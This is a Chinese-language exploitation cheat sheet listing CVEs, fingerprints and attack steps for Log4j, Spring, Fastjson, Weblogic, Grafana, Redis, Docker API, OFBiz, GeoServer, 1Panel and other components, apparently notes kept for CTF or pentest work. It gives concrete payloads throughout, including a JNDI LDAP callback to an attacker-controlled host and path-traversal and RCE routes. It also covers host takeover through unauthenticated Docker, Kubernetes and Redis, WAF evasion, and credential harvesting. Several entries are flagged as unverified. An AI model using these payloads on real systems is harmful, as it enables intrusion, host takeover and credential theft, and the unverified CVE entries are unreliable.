# 卡:经典 Web / 中间件 / 运维组件 CVE 速查

**用法**:指纹出组件后**先确认版本**,再挑"目标版本未修"的那几条打。CVE 号只是检索锚点 ——
用官方公告核对影响范围再动手;下面每条都给"怎么验"而不只是"漏洞名"。

> 这里只收录**公开通告**里长期有效的经典条目(内网/靶场版本普遍偏旧,命中率高)。
> 拿不准的组件只写类别不编号,避免把你带偏。

## 反序列化 / 表达式注入(命中即 RCE)

| 组件 | 指纹 | 通告锚点 | 验证方法 |
|---|---|---|---|
| Log4j2 | Java 应用 + 日志里出现 `${jndi:` | CVE-2021-44228(2.0-beta9 ~ 2.14.1) | 任一"会被打日志"的输入点(UA/参数/头)塞 `${jndi:ldap://<自控>/a}`;用自建 LDAP/DNS 回连即可确认(**回连就算成立**,不必先建完整 payload) |
| Spring MVC/WebFlux | 报错页/`X-Application-Context`、`/actuator` 可达 | CVE-2022-22965(Spring4Shell) | 先 `GET /actuator` 看是否暴露;再用 `class.module.classLoader.*` 绑参探测 `POST /` + `Content-Type: application/x-www-form-urlencoded` |
| Spring Cloud Gateway | `/actuator/gateway/routes` 返回 JSON | CVE-2022-22947 | `POST /actuator/gateway/routes/<x>`(SpEL 短路表达式)→ `POST /actuator/gateway/refresh` → 访问该路由看回显 |
| Fastjson | Java 服务 + 报错含 `com.alibaba.fastjson` | CVE-2017-18349(1.2.24) | 找"能塞 JSON 且被服务端反序列化"的入口(登录/回调/配置导入),用 `{"@type":"java.net.Inet4Address","val":"<自控域>"}` 先测 DNS 回连 |
| Shiro | 响应头 `rememberMe=deleteMe` | CVE-2016-4437 | 先跑 `shiro-550` 检测脚本拿密钥(硬编码 AES key)→ 再生成 rememberMe → 反序列化链;关键是**先确认密钥**再谈链 |
| Weblogic | 7001 端口 + `/console` | CVE-2020-14882/14883、CVE-2019-2725 | 14882 的路径穿越(`/console/css/%252e%252e%252fconsole.portal`)可直接进后台;先在 `/console/login/LoginForm.jsp` 确认版本 |
| ThinkPHP(5.0/5.1) | 报错页含 `ThinkPHP`、`index.php?s=` 路由 | CVE-2018-20062 等 | `?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1` 类路由注入;先探路由风格 |
| Drupal | 生成器 meta / CHANGELOG | CVE-2018-7600、CVE-2019-6340 | 7600:匿名访问 `user/register?element_parents=...` 表单参数注入;先 `CHANGELOG.txt` 读版本 |

## 路径穿越 / 任意文件读写

| 组件 | 指纹 | 通告锚点 | 验证方法 |
|---|---|---|---|
| Grafana | `/login` 页面 + `grafana_version` 在 `/api/health` | CVE-2021-43798 | `GET /public/plugins/<插件名>/../../../../../etc/passwd`;插件名写死几个常见的(alertlist/graphite) |
| Tomcat | 8080 + `Server: Apache-Coyote` | CVE-2020-1938(Ghostcat, AJP 8009) | AJP 端口在 → 用 `ajpShooter` 类工具读 `WEB-INF/web.xml`;另外先试 `PUT` 上传 jsp(CVE-2017-12615,需 readonly=false) |
| MinIO | 9000 + `/minio/health/live` | CVE-2023-28432 | `POST /minio/bootstrap/v1/verify` 返回环境变量(含 `MINIO_ROOT_USER/PASSWORD`)—— 拿凭据再列举 bucket |
| Jenkins | `/login` + `X-Jenkins` 头(带版本) | CVE-2018-1000861、CVE-2019-1003000 | 先按 `X-Jenkins` 版本比对;1000861 是 stapler 路由可达任意方法,验证:构造 `.../securityRealm/user/admin/descriptorByName/...` 看是否 500/回显 |
| Confluence | `/login.action` + 版本 | CVE-2021-26084、CVE-2022-26134 | 26134:`GET /%24%7B%28%23a%3D...%7D/` 直接 OGNL RCE;先用 `/rest/api/` 探版本再发最小 OGNL |
| GitLab | `/-/manifest.json` 带版本 | CVE-2021-22205 | 登录后上传图片触发 ExifTool 命令执行;先确认版本 < 13.10.3 |

## 未授权 / 弱鉴权(不需要 CVE 号也要试)

| 组件 | 指纹 | 打法 |
|---|---|---|
| Redis | 6379 + `redis-cli` 连上无鉴权 | `INFO` 确认;写 SSH key / 写 crontab / 主从复制 RCE(`MODULE LOAD`);**先看有没有 `rename-command`** |
| Docker API | 2375/2376 返回 `ApiVersion` | `GET /containers/json` → 起一个挂 `/` 的容器即可读宿主文件 |
| etcd | 2379 + `/version` | `/v2/keys/?recursive=true` 或 v3 `range` 拉全部键(常在 `.../ca.crt`、token、密码) |
| Kubernetes API | 6443/8080 + `/api/v1/namespaces` | 未授权或 SA token 可读 → 起 pod 挂宿主;先 `GET /api/v1/namespaces` 看是否 200 |
| Nacos | `/nacos/` 控制台 | CVE-2021-29441:`User-Agent: Nacos-Server` 绕过鉴权直接读用户列表/加用户 |
| Jupyter | 8888 + `/tree` 直接进 | 未设 token/password → 直接开 terminal 执行命令(设计内,不是 CVE);若有 token,先翻历史 URL/配置 |
| Solr | 8983 + `/solr/admin/cores` | CVE-2019-17558:cores 的 config API 打开 `params.resource.loader.enabled` → velocity 模板 RCE |
| Kibana | 5601 + `/app/kibana` | CVE-2019-7609:Timelion 面板注入 → 起进程;先确认版本 < 7.0 |
| Airflow | 8080 + `/admin/` | 未授权或默认口令 → DAG 里改 `BashOperator` 命令即 RCE;老版本 CVE-2020-11981(Celery broker) |
| SaltStack | 4505/4506 | CVE-2020-11651/11652:master 未授权 → 直接发指令到 minion 执行 |

## 边界

- **顺序**:未授权 → 路径穿越/信息泄露 → 已知 RCE。前两类几乎无副作用,先把能读的东西读干净(配置里常有凭据)。
- **别在 WAF 面硬刚**:被拦就换编码/换参数位置,或改走"未授权接口"这类不触发 WAF 的路径。
- **拿到文件读能力后**:优先读组件自己的配置(config/secret/token/db 连接串),再谈 RCE;
  很多题只要求"读出 flag 文件",不需要命令执行。
---

## CVE 表:本轮(2026-09-29)实测/检索涉及的组件

**状态图例**:`✅实测` = 真实目标上看到路由/版本并有验证动作;`📋公告` = 公开通告的经典条目;`⚠候选` = 检索上下文出现但未核实。

### 图数据库 / 数据面

| CVE | 组件 | 影响 | 路由/触发 | 验证方法 | 状态 |
|---|---|---|---|---|---|
| CVE-2024-27348 | **Apache HugeGraph**(< 1.3.0) | **Gremlin 沙箱绕过 → RCE** | `/gremlin`、`/apis/gremlin` | 先 `GET /apis/version` 拿版本;POST Gremlin 脚本里用 Java 反射(`Thread.currentThread()…`)拿 `Runtime`;实测**沙箱会拦文件/命令**,要配合下面的绕过或改读配置/环境变量 | ✅实测 |
| CVE-2024-43441 | HugeGraph | 认证绕过 | REST API | 未授权访问管理接口 | ⚠候选 |
| CVE-2024-27349 | HugeGraph | 未核实 | — | — | ⚠候选 |
| CVE-2024-2734 | HugeGraph | SecurityManager 绕过(候选) | Gremlin | 与 27348 配套使用 | ⚠候选 |

> HugeGraph 的实用近路:**同机常同时开着 JDWP(5005)/ Arthas(8561/8562)** —— 见到这些端口直接转 `cards/jdwp-rce`;
> 另外默认口令 `admin:admin` 很常见。

### 地理/空间服务(GeoServer)

| CVE | 影响 | 路由/触发 | 验证方法 | 状态 |
|---|---|---|---|---|
| CVE-2024-36401 | **未授权 RCE**(影响 2.22.0–2.22.6 / 2.23.0–2.23.2 / 2.24.0–2.24.3 / 2.25.0) | `POST /geoserver/wfs` 等 OGC 接口 | 在 OGC filter 的 `valueReference` 里注入 XPath(如 `exec(java.lang.Runtime…)`) | 📋公告 |
| CVE-2024-36404 | XPath 注入 → RCE | 同上 | 同类注入面 | ⚠候选 |
| CVE-2023-25157 | OGC filter SQL 注入 | `/geoserver/wfs` | 先看 `/geoserver/web/` 是否默认口令 `admin/geoserver` | 📋公告 |
| CVE-2023-25158 | OGC filter SQL 注入(同族) | `/geoserver/wfs` | 与 25157 同一注入面;版本区间按上游公告核对 | 📋公告 |

### 企业应用 / 工作流(带 web 控制台的老 Java 应用)

| CVE | 组件 | 影响 | 路由/触发 | 状态 |
|---|---|---|---|---|
| CVE-2023-51467 | **Apache OFBiz** | 认证绕过 → 预认证 RCE | `/webtools/control/ProgramExport`、`/webtools/control/ping` | ✅实测(按此打) |
| CVE-2024-38856 | Apache OFBiz | 认证绕过(51467 的后续) | 同上 | ✅实测(按此打) |
| CVE-2023-49070 | Apache OFBiz | 认证绕过 | `/webtools/control/xmlrpc` 方向 | 📋公告 |
| CVE-2021-29200 | Apache OFBiz | RCE(反序列化) | `/webtools/control/xmlrpc` | 📋公告 |
| CVE-2020-9496 | Apache OFBiz | XML-RPC 反序列化 | `/webtools/control/xmlrpc` | 📋公告 |
| CVE-2024-23955 / 45195 / 45507 | Apache OFBiz | SSRF / RCE(条目名来自检索上下文) | — | ⚠候选 |
| CVE-2023-46604 | **Apache ActiveMQ** | OpenWire 反序列化 RCE(与 OFBiz 常同机:61616 端口) | 发 OpenWire 包指定 `ClassPathXmlApplicationContext` 指向自控 XML;先探 `61616` | 📋公告 |

> 判 OFBiz 的指纹:`/content/control/main` 返回 ControlServlet 特征、`Server: Apache-Coyote`(Tomcat 承载)。

### 运维面板(1Panel)

| CVE | 影响 | 路由/触发 | 验证方法 | 状态 |
|---|---|---|---|---|
| CVE-2025-54424 | **Agent 证书校验绕过 → RCE** | Agent WS `/hosts/terminal` | 用 `CN=panel_client` 的**自签证书**即可连上 Agent 的 WebSocket 终端并执行命令;登录口常被"安全入口"藏起来,别在登录页死磕 | ✅实测 |
| CVE-2025-30406 | 未核实(条目名来自检索上下文) | — | — | ⚠候选 |

### 远程访问面(SSH)

| CVE | 组件 | 影响 | 说明 | 状态 |
|---|---|---|---|---|
| CVE-2024-6387 | OpenSSH(regreSSHion) | 预认证 RCE | 对 8.5p1–9.7p1 有理论可行性;实测场景多是"知道有洞但利用不稳",**别把整题押在它上面** | 📋公告 |
| CVE-2023-38408 | OpenSSH ssh-agent 转发 | RCE | 需要 agent 转发链路;跳板机题里作为"不登录就读文件"的候选路径讨论过 | 📋公告 |

### TLS / 底层

| CVE | 组件 | 影响 | 验证方法 | 状态 |
|---|---|---|---|---|
| CVE-2014-0160 | OpenSSL(Heartbleed) | 内存泄露 | 客户端发 `payload_length` 大于实际 payload,看响应是否多回字节(实测这类题的关键是**先确认长度字段的字节序与回显位置**) | ✅实测 |

### 候选待核

`CVE-2024-2734` · `CVE-2024-27349` · `CVE-2024-43441` · `CVE-2024-23955` · `CVE-2024-36404` · `CVE-2024-45195` ·
`CVE-2024-45507` · `CVE-2025-30406`

同处理原则:先按 `find-cve.md` 核对,核不上就别打。
